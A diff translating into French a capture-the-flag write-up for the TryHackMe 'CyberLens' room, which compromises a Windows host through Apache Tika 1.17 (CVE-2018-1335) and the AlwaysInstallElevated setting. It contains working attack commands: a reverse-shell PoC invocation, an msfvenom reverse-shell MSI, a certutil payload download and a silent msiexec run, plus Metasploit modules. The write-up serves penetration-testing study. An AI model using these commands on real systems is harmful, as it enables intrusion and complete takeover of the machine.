@@ -99,53 +99,51 @@ Après avoir capturé la requête que nous obtenons lorsque nous cliquons sur `G
 
 En accédant au port, nous arrivons à une page web présentant Apache Tika 1.17.
 
-> "The Apache Tika toolkit detects and extracts metadata and text from over a thousand different file types (such as PPT, XLS, and PDF)." Source - https://github.com/apache/tika
-
 ![Apache Tika Server](/images/THM-CyberLens/Apache-Tika.png)
 
-**We are able to solve this room entirely via Metasploit, this writeup will showcase the manual way and the Metasploit method.**
+**Il est possible de résoudre ce défi entièrement via Metasploit, cet article présentera la méthode manuelle et la méthode Metasploit.**
 
 ## Exploitation manuelle
 
 ### Accès initial
 
-Researching "Apache Tika 1.17 rce" leads us to [this](https://rhinosecuritylabs.com/application-security/exploiting-cve-2018-1335-apache-tika/) Rhino Security Labs article featuring CVE-2018-1335. A PoC is also available [here](https://github.com/RhinoSecurityLabs/CVEs/blob/master/CVE-2018-1335/CVE-2018-1335.py). To use it  we have to follow this example:
+Une recherche sur "Apache Tika 1.17 rce" nous conduit à [ce](https://rhinosecuritylabs.com/application-security/exploiting-cve-2018-1335-apache-tika/) article de Rhino Security Labs présentant le CVE-2018-1335. Un PoC est également disponible [ici](https://github.com/RhinoSecurityLabs/CVEs/blob/master/CVE-2018-1335/CVE-2018-1335.py). Pour l'utiliser, nous devons suivre cet exemple :
 
 ```
 python3 CVE-2018-1335.py <host> <port> <command>
 ```
 
-Since we are targeting a Windows machine we can make use of PowerShell to get a reverse shell.
+Puisque nous ciblons une machine Windows, nous pouvons utiliser PowerShell pour obtenir un reverse shell.
 
-> On [revshells.com](https://www.revshells.com/), we use a PowerShell #3 (base64) reverse shell
+> Sur [revshells.com](https://www.revshells.com/), nous utilisons un reverse shell PowerShell #3 (base64)
 
 ```
 python3 CVE-2018-1335.py <Target_IP> <PORT_NUMBER> <INSERT REVSHELL HERE>
 ```
-After running the exploit we get a connection on our listener, we have a shell as the user `cyberlens`.
+Après exécution de notre commande, nous obtenons une connexion sur notre listener, nous avons un shell en tant qu'utilisateur `cyberlens`.
 
 ![Apache Tika Server](/images/THM-CyberLens/initial-foothold.png)
 
-We find the user flag on the user's Desktop.
+Nous trouvons le fichier `user.txt` sur le bureau de l'utilisateur.
 
 ![user.txt location](/images/THM-CyberLens/user-flag.png)
 
 ### Elévation de Privilèges
 
-For the system enumeration we use [WinPEAS](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS) and find that `AlwaysInstallElevated` is enabled.
+Pour l'énumération du système, nous utilisons [WinPEAS](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS) et nous découvrons que `AlwaysInstallElevated` est activé.
 
 ![Winpeas finds AlwaysInstallElevated is enabled](/images/THM-CyberLens/AlwaysInstallElevated.png)
 
-The `AlwaysInstallElevated` setting in Windows is a Group Policy setting that, when enabled, allows Windows Installer to install programs with elevated privileges (i.e., administrative rights) regardless of the user's current privilege level. This setting is controlled through two registry keys:
+Le paramètre `AlwaysInstallElevated` de Windows est un paramètre de stratégie de groupe qui, lorsqu'il est activé, permet à Windows Installer d'installer des programmes avec des privilèges élevés (c'est-à-dire des droits d'administration), quel que soit le niveau de privilège actuel de l'utilisateur. Ce paramètre est contrôlé par deux clés de registre:
 
 1. **HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated**
 2. **HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated**
 
-If both of these registry keys are set to `1`, it means that any user, including those with only standard user privileges, can install MSI packages with elevated (administrator) privileges. *You can read more about it [here](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#alwaysinstallelevated).*
+Si ces deux clés de registre ont la valeur "1", cela signifie que n'importe quel utilisateur, y compris ceux qui n'ont que des privilèges d'utilisateur standard, peut installer des packages MSI avec des privilèges élevés (administrateur). *Vous pouvez en savoir plus à ce sujet [ici](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#alwaysinstallelevated).*
 
-[This](https://juggernaut-sec.com/alwaysinstallelevated/#Abusing_AlwaysInstallElevated_to_Obtain_a_SYSTEM_Shell) article explains how to abuse `AlwaysInstallElevated` to obtain a SYSTEM Shell.
+[Cet article](https://juggernaut-sec.com/alwaysinstallelevated/#Abusing_AlwaysInstallElevated_to_Obtain_a_SYSTEM_Shell) explique comment abuser de `AlwaysInstallElevated` pour obtenir un Shell SYSTEM.
 
-1. We craft a malicious msi file
+1. Nous créons un fichier msi malveillant
 
 ```
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.2.104.130 LPORT=1234 -a x64 --platform Windows -f msi -o evil.msi
@@ -153,23 +151,23 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.2.104.130 LPORT=1234 -a x64 -
 
 ![Malicious msi ile created with msfvenom](/images/THM-CyberLens/malicious-msi.png)
 
-2. Send it to the target 
+2. Ensuite, nous le téléchargeons sur la cible 
 
 ```
 certutil.exe -urlcache -split -f http://IP_ADDRESS:PORT_NUMBER/evil.msi evil.msi
 ```
 
-3. Execute the msi file 
+3. Nous exécutons le fichier msi
 
 ```
 msiexec /quiet /qn /i evil.msi
 ```
 
-4. We get a connection on our listener as `nt authority\system`
+4. Finalement nous obtenons une connexion sur notre listener en tant que `nt authority\system`.
 
 ![System shell](/images/THM-CyberLens/system-shell.png)
 
-We can read the root flag (admin.txt) on the `Administrator` Desktop.
+Nous trouvons le fichier `admin.txt` sur le bureau de l'administrateur.
 
 ![System shell](/images/THM-CyberLens/root-flag-manual.png)
 
@@ -179,55 +177,51 @@ We can read the root flag (admin.txt) on the `Administrator` Desktop.
 
 ### Accès initial
 
-We know which software we are targeting, so we check Metasploit for exploits.
+Nous avons le nom du logiciel, donc nous cherchons des exploits dans Metasploit.
 
-We do find an exploit for `Header Command Injection`.
+Nous trouvons un exploit pour `Header Command Injection`.
 
 ![Metasploit fins exploit for Apache Tika](/images/THM-CyberLens/apache-tika-exploit.png)
 
-> Make sure to set all the options correctly. The remote port should be `61777`.
+> Assurez-vous de définir toutes les options correctement. Le port distant (RPORT) doit être `61777`.
 
-After running the exploit we get a meterpreter shell.
+Après avoir exécuté le module, nous obtenons un shell meterpreter.
 
 ![Meterpreter shell](/images/THM-CyberLens/meterpreter-shell.png)
 
-We find the user flag on the user Desktop.
-
 ### Elévation de Privilèges
 
-Now to elevate our privileges we can use the `exploit_suggester` in Metasploit to find some leads.
+Pour élever nos privilèges, nous pouvons utiliser le `exploit_suggester` de Metasploit afin de trouver des pistes.
 
-> You can background the current meterpreter shell with `background`
+> Vous pouvez mettre en arrière-plan le shell meterpreter actuel avec `background`
 
 ![Metasploit exploit suggester for privilege escalation](/images/THM-CyberLens/metasploit-privesc.png)
 
-All we have to do is to provide a session number and run the module.
+Il suffit de fournir un numéro de session et d'exécuter le module.
 
 ![Metasploit - Exploit suggester module use](/images/THM-CyberLens/exploit-suggester.png)
 
-It finds five possible exploits for our target.
+Le module trouve cinq possibilités d'exploitation pour notre cible.
 
 ![Exploits list found by exploit suggester in Metasploit](/images/THM-CyberLens/exploits-list.png)
 
-We start with the first one.
+Normalement, nous devrions les essayer toutes, mais nous savons que notre cible est vulnérable à `AlwaysInstallElevated`.
 
 ```
 use exploit/windows/local/always_install_elevated
 ```
 
-We need to provide a session number, a local host and a local port.
+Nous devons fournir un numéro de session, un hôte local et un port local.
 
 ![AlwaysInstallElevated exploit in Metasploit](/images/THM-CyberLens/installed-elevated-exploit.png)
 
-After running the exploit we get an elevated meterpreter session as `NT AUTHORITY\SYSTEM`.
+Après avoir exécuté le module, nous obtenons une session meterpreter élevée en tant que `NT AUTHORITY\SYSTEM`.
 
 ![Meterpreter system shell](/images/THM-CyberLens/admin-shell.png)
 
 ## Mots de Fin
 
-Metasploit is a powerful framework allowing you to automate a lot of tasks. I am still learning how to optimally use it in order to make my life easier. I found two resources that will be helpful:
-* [Metasploit Unleashed](https://www.offsec.com/metasploit-unleashed/) - A free course by Offensive Security teaching you how to thoroughly use the framework.
-* [Metasploit: The Penetration Tester's Guide](https://www.amazon.com/Metasploit-Penetration-Testers-David-Kennedy/dp/159327288X) - This book is old but it will deepen your understanding of the framework. If you end up liking it, know that the second edition is coming out in November 2024.
-
-**Note:** OSCP seekers should learn **NOT** to rely too much on Metasploit because you are only allowed to use it once during the exam.
+Si vous êtes un professionnel de la cybersécurité en devenir, la maîtrise de Metasploit vous sera d'une grande utilité. Vous trouverez ci-dessous deux ressources qui vous seront utiles :
+* [Metasploit Unleashed](https://www.offsec.com/metasploit-unleashed/) - Un cours gratuit d'Offensive Security qui vous apprend à utiliser le framework de manière approfondie.
+* [Metasploit: The Penetration Tester's Guide](https://www.amazon.com/Metasploit-Penetration-Testers-David-Kennedy/dp/159327288X) - Ce livre date de 2011, mais il vous permettra d'approfondir votre compréhension de Metasploit. Si vous l'appréciez, sachez que la deuxième édition sortira en novembre 2024.
 
